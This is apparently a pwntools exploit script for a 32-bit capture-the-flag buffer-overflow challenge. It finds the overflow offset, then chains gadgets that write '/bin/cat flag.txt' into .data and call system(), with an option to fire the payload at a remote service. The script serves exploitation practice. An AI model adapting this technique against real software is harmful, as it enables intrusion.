import argparse
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# TODO: Change these if necessary
x64 = False
pattern_size = 100
should_log = True

def ff_to_overflow(p):
	# TODO: Change this function to navigate to the overflow.
	print p.recvuntil("> ")

def find_offset(p):
	log.info("Using {} byte pattern".format(pattern_size))
	ff_to_overflow(p)
	p.sendline(cyclic(pattern_size, n=8 if x64 else 4))
	p.interactive()
	return

def exploit(p, bin_fname, libc_fname):
	e = ELF(bin_fname)
	libc = ELF(libc_fname) if libc_fname else None
	ff_to_overflow(p)

	"""
		Examples:

		func_offset = libc.symbols['puts'] 	# Offset in libc
		puts_addr = p32(e.got['puts'])
		main = e.symbols['main']
		addr_string = next(e.search('/bin/cat flag.txt'))
	"""

	data = 0x804a028 # .data section

	# Get something into edx
	clear_edx = 0x08048671 # xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
	pop_ebx = 0x080483e1 # pop ebx ; ret
	mov_bd = 0x0804867b # xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret

	# Get something into ecx
	swap_cd = 0x08048689 # xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
	write = 0x08048693 # mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret

	i = 0
	comm = "////bin/cat flag.txt"

	buf = cyclic_find('laaa') * 'a'

	# [////] Put .data into ecx
	buf += p32(clear_edx)   # edx = 0
	buf += 'a' * 4
	buf += p32(pop_ebx)     # ebx = .data
	buf += p32(data + i)
	buf += p32(mov_bd)      # edx = .data
	buf += 'a' * 4
	buf += p32(swap_cd)     # ecx = .data
	buf += 'a' * 4
	# Put string into edx
	buf += p32(clear_edx)   # edx = 0
	buf += 'a' * 4
	buf += p32(pop_ebx)     # ebx = comm[i:i+4]
	buf += comm[i:i+4]
	buf += p32(mov_bd)      # edx = comm[i:i+4]
	buf += 'a' * 4
	# Call write and make sure xor doesn't do anything
	buf += p32(write)
	buf += 'a' * 4
	buf += p32(0)
	i += 4

	# [bin/] Put .data into ecx
	buf += p32(clear_edx)   # edx = 0
	buf += 'a' * 4
	buf += p32(pop_ebx)     # ebx = .data
	buf += p32(data + i)
	buf += p32(mov_bd)      # edx = .data
	buf += 'a' * 4
	buf += p32(swap_cd)     # ecx = .data
	buf += 'a' * 4
	# Put string into edx
	buf += p32(clear_edx)   # edx = 0
	buf += 'a' * 4
	buf += p32(pop_ebx)     # ebx = comm[i:i+4]
	buf += comm[i:i+4]
	buf += p32(mov_bd)      # edx = comm[i:i+4]
	buf += 'a' * 4
	# Call write and make sure xor doesn't do anything
	buf += p32(write)
	buf += 'a' * 4
	buf += p32(0)
	i += 4

	# [cat ] Put .data into ecx
	buf += p32(clear_edx)   # edx = 0
	buf += 'a' * 4
	buf += p32(pop_ebx)     # ebx = .data
	buf += p32(data + i)
	buf += p32(mov_bd)      # edx = .data
	buf += 'a' * 4
	buf += p32(swap_cd)     # ecx = .data
	buf += 'a' * 4
	# Put string into edx
	buf += p32(clear_edx)   # edx = 0
	buf += 'a' * 4
	buf += p32(pop_ebx)     # ebx = comm[i:i+4]
	buf += comm[i:i+4]
	buf += p32(mov_bd)      # edx = comm[i:i+4]
	buf += 'a' * 4
	# Call write and make sure xor doesn't do anything
	buf += p32(write)
	buf += 'a' * 4
	buf += p32(0)
	i += 4

	# [flag] Put .data into ecx
	buf += p32(clear_edx)   # edx = 0
	buf += 'a' * 4
	buf += p32(pop_ebx)     # ebx = .data
	buf += p32(data + i)
	buf += p32(mov_bd)      # edx = .data
	buf += 'a' * 4
	buf += p32(swap_cd)     # ecx = .data
	buf += 'a' * 4
	# Put string into edx
	buf += p32(clear_edx)   # edx = 0
	buf += 'a' * 4
	buf += p32(pop_ebx)     # ebx = comm[i:i+4]
	buf += comm[i:i+4]
	buf += p32(mov_bd)      # edx = comm[i:i+4]
	buf += 'a' * 4
	# Call write and make sure xor doesn't do anything
	buf += p32(write)
	buf += 'a' * 4
	buf += p32(0)
	i += 4

	# [.txt] Put .data into ecx
	buf += p32(clear_edx)   # edx = 0
	buf += 'a' * 4
	buf += p32(pop_ebx)     # ebx = .data
	buf += p32(data + i)
	buf += p32(mov_bd)      # edx = .data
	buf += 'a' * 4
	buf += p32(swap_cd)     # ecx = .data
	buf += 'a' * 4
	# Put string into edx
	buf += p32(clear_edx)   # edx = 0
	buf += 'a' * 4
	buf += p32(pop_ebx)     # ebx = comm[i:i+4]
	buf += comm[i:i+4]
	buf += p32(mov_bd)      # edx = comm[i:i+4]
	buf += 'a' * 4
	# Call write and make sure xor doesn't do anything
	buf += p32(write)
	buf += 'a' * 4
	buf += p32(0)
	i += 4

	# Call system
	buf += p32(e.symbols['system'])
	buf += 'a' * 4
	buf += p32(data)

	p.sendline(buf)
	p.interactive()
	return

if __name__ == '__main__':

	# Remote service address/port
	IP = ''
	PORT = 0

	# Parse arguments
	parser = argparse.ArgumentParser()
	parser.add_argument("binary_name", help="Binary file name")
	parser.add_argument("-l", "--libc", help="libc file name")
	parser.add_argument("--offset", help="Find overflow offset", action="store_true")
	parser.add_argument("--remote", help="Run exploit on remote service", action="store_true")
	parser.add_argument("--nodebug", help="Run exploit without GDB", action="store_true")
	args = parser.parse_args()

	# Get file names
	bin_fname = args.binary_name
	libc_fname = args.libc

	# Run binary
	if args.remote:
		r = remote(IP, PORT)
		log.info("Running remote exploit...")
		exploit(r, bin_fname, libc_fname)
	else:
		p = process(bin_fname)
		log.info("Running local exploit...")
		gdb_cmd = [
			"c"
		]

		# Use gdb.debug if it seems like the GDB commands aren't working.
		if not args.nodebug:
			p = gdb.debug(bin_fname, gdbscript="\n".join(gdb_cmd))
			# gdb.attach(p, gdbscript="\n".join(gdb_cmd))

		# Find offset or debug
		if args.offset:
			find_offset(p)
		else:
			exploit(p, bin_fname, libc_fname)
